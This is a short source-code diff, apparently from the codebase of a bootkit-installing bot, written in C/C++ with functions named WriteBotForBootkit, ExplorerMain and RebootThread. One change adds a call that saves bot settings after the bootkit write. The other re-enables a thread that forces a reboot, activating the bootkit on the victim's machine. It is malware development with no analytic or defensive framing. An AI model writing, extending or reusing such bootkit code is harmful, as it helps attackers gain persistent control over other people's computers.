@@ -411,6 +411,7 @@ static bool SavedBot()
 	{
 		if( WriteBotForBootkit( dataBot, sizeBot ) )
 		{
+			BOT::SaveSettings(true, false, false);
 			res = true;
 		}
 		MemFree(dataBot);
@@ -497,7 +498,7 @@ BOOL ExplorerMain()
 		//STR::Free(fileBot);
 		DWORD thid = 0;
 		PP_DPRINTF("ExplorerMain: starting reboot thread and reboot notify thread");
-		//pCreateThread(NULL, 0, RebootThread, NULL, 0, &thid);
+		pCreateThread(NULL, 0, RebootThread, NULL, 0, &thid);
 		pCreateThread(NULL, 0, RebootNotifyThread, NULL, 0, &thid);
 	}
 
